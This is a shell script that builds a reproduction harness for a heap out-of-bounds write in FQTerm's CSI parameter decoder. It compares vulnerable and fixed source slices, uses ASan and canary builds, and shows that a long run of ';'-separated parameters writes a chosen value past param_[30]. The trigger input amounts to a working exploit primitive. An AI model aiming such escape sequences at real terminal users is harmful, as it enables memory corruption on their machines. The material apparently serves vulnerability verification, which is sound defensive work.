#!/bin/sh
# fqterm2shell direct-call harness (CVE-2026-131875 / GHSA-8m6p-6hq3-xcx4, fix e340b62).
# Verbatim slices of pinned FQTermDecode clearParam()/paramDigit()/nextParam()
# (parent 079b6d5 vulnerable / fix e340b62 fixed) are included under #line
# control. Stubs are confined to the surrounding Qt types and the FSM dispatch
# loop. No Qt build, telnet/SSH socket, terminal process or network is involved.
set -eu
HERE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
SRC=$(CDPATH= cd -- "$HERE/../src" && pwd)
mkdir -p "$HERE/evidence"

gen_driver() { # variant
    v=$1
    if [ "$v" = vuln ]; then lo=679; hi=700; tag=fqterm_decode.cpp.vuln; f=$SRC/fqterm_decode.cpp.vuln
    else                    lo=679; hi=705; tag=fqterm_decode.cpp.fixed; f=$SRC/fqterm_decode.cpp.fixed
    fi
    out="$HERE/driver-$v.cpp"
    {
        cat <<'HEADER'
/* Generated by harness/run.sh. Pinned upstream bytes are under #line;
   everything else is a declared stub. Do not edit this file by hand. */
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <new>

/* FQ_FUNC_TRACE is a debug trace macro in the real build; no-op here. */
#define FQ_FUNC_TRACE(a, b) ((void)0)

/* ---- declared stubs mirroring the pinned fqterm_decode.h member types ---- */
struct StateOptionStub { int byte; void* action; void* nextState; };
struct QByteArrayStub { void* d; };   /* size-equivalent POD for Qt's QByteArray */
struct FQTermBuffer;

/* Member order and count mirror fqterm_decode.h.fixed verbatim: the two
   pointer slots stand in for the QObject base (vptr + QObjectPrivate*);
   QByteArray/savedMode_/currentMode_/termBuffer_/server_encoding_/leftToDecode_
   are present so param_[30] is NOT at the object's end, exactly as upstream.
   Exact Qt ABI sizes are a claim; these are size-equivalent 64-bit PODs. */
struct FQTermDecode {
    void* qobject_vptr_stub;
    void* qobject_private_stub;
    bool isBell_;
    unsigned char current_color_, default_color_, current_attr_, default_attr_;
    StateOptionStub* current_state_;
    bool interrupt_decode_;
    const char* inputData_;
    int inputLength_, dataIndex_;
    int paramIndex_, param_[30];
    bool isParamAvailable_;
    QByteArrayStub textParam_;
    bool savedMode_[30];
    bool currentMode_[30];
    FQTermBuffer* termBuffer_;
    int server_encoding_;
    QByteArrayStub leftToDecode_;

    void clearParam();
    void paramDigit();
    void nextParam();
};

HEADER
        printf '#line %d "%s"\n' "$lo" "$tag"
        awk -v lo="$lo" -v hi="$hi" 'NR>=lo && NR<=hi' "$f"
        cat <<'TAIL'

/* #line reset: only the slice above is pinned upstream bytes; the stub dispatch
   and harness below are generated code, not attributed to the pinned file. */
#line 1 "driver-stub.cpp"

/* ---- declared stub FSM dispatch + harness main (not pinned bytes) ---- */
#ifdef ASAN_BUILD
/* Allocation is exactly one FQTermDecode: the out-of-range store crosses the
   ASan allocation boundary at param_[55] (offset 280 == sizeof object). */
using Obj = FQTermDecode;
static FQTermDecode& dec(Obj& o) { return o; }
#else
/* Plain build appends a 0xa5 canary so chosen bytes can be read after the
   store; the real object has no such canary. */
struct Obj { FQTermDecode d; unsigned char canary[512]; };
static FQTermDecode& dec(Obj& o) { return o.d; }
#endif

static const int NPARAM = 60;          /* separators driven past param_[30] */
static const int SLOT35 = 35;          /* slot used for the chosen 32-bit value */

static void feed(Obj& o, const char c) {
    /* Mirrors pinned bracket_state_ entries: digit -> paramDigit(), ';' ->
       nextParam(), '[' -> clearParam(). Dispatch table itself is a stub. */
    FQTermDecode& d = dec(o);
    d.inputData_ = &c;
    d.inputLength_ = 1;
    d.dataIndex_ = 0;
    if (c >= '0' && c <= '9') d.paramDigit();
    else if (c == ';')        d.nextParam();
    else if (c == '[')        d.clearParam();
}

static void put_digits(Obj& o, const char* digits) {
    for (const char* p = digits; *p; ++p) feed(o, *p);
}

int main(int argc, char** argv) {
    const char* sc = argc > 1 ? argv[1] : "baseline";
    Obj* op = new Obj;
    std::memset(op, 0, sizeof(*op));
    Obj& o = *op;
    FQTermDecode& d = dec(o);
    feed(o, '[');                      /* CSI entry clears the param table */
    if (std::strcmp(sc, "baseline") == 0) {
        put_digits(o, "1"); feed(o, ';');
        put_digits(o, "2"); feed(o, ';');
        put_digits(o, "3");
    } else {                           /* oob-chosen and fixed-same */
        for (int i = 0; i < NPARAM; ++i) {
            if (i == SLOT35) put_digits(o, "1515870810"); /* 0x5A5A5A5A */
            else             feed(o, '9');                /* 0x09 */
            if (i != NPARAM - 1) feed(o, ';');
        }
    }
    std::printf("rc=0 scenario=%s paramIndex=%d p0=%d p29=%d\n",
                sc, d.paramIndex_, d.param_[0], d.param_[29]);
    std::printf("sizeof_obj=%zu off_param=%zu off_end=%zu\n",
                sizeof(FQTermDecode),
                (size_t)((char*)d.param_ - (char*)&d),
                (size_t)((char*)&d + sizeof(FQTermDecode) - (char*)&d));
#ifndef ASAN_BUILD
    std::printf("slot35=%08x\n", (unsigned)d.param_[SLOT35]);
    std::printf("canary:");
    for (int i = 0; i < 16; ++i) std::printf(" %02x", o.canary[i]);
    std::printf("\n");
#endif
    delete op;
    return 0;
}
TAIL
    } > "$out"
}

gen_driver vuln
gen_driver fixed


# Physical copy of the #line virtual stub file so gdb resolves stub lines.
awk 'f{print} /#line 1 "driver-stub.cpp"/{f=1}' "$HERE/driver-vuln.cpp" > "$HERE/driver-stub.cpp"
build() { # cc variant mode
    cc=$1; v=$2; mode=$3
    flags="-O0 -g -std=c++11 -fno-omit-frame-pointer"
    if [ "$mode" = asan ]; then flags="$flags -fsanitize=address -DASAN_BUILD"; fi
    # shellcheck disable=SC2086
    $cc $flags "$HERE/driver-$v.cpp" -o "$HERE/bin-$cc-$v-$mode"
}
for cc in g++ clang++; do
    for v in vuln fixed; do
        for mode in plain asan; do
            build "$cc" "$v" "$mode"
        done
    done
done
echo "built 8 binaries"
